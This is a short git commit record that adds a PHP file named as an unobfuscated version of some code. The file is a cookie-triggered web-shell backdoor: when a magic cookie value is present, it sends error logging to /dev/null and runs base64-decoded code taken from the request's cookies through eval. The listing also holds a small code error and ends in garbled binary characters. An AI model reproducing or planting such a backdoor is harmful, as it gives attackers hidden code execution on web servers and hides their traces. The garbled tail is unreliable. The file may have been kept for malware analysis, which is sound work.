94a6cdd78b63e69b07e452d6f6cc352f83ee6be7
brain <syrel78@yahoo.com>
2013-03-16 18:48:36 -0700

    + ‘imafreak/newCode-unobfuscated.php’

---
+++ imafreak/newCode-unobfuscated.php
@@ -0,0 +1,12 @@
+
+
+if(reset($_COOKIE)=='12' && count($_COOKIE)>3){ini_set('error_log', '/dev/null');
+echo '<3123>';
+eval(base64_decode(
+    preg_replace(
+            array('/[^\w=\s]/' , '/\s/'), array( '' , '+' ), join(array_slice($_COOKIE,  $count($_COOKIE)-3)
+                                                                                )
+                    )
+                         )
+                                );
+echBsÂòrâF²âsâs·Ð
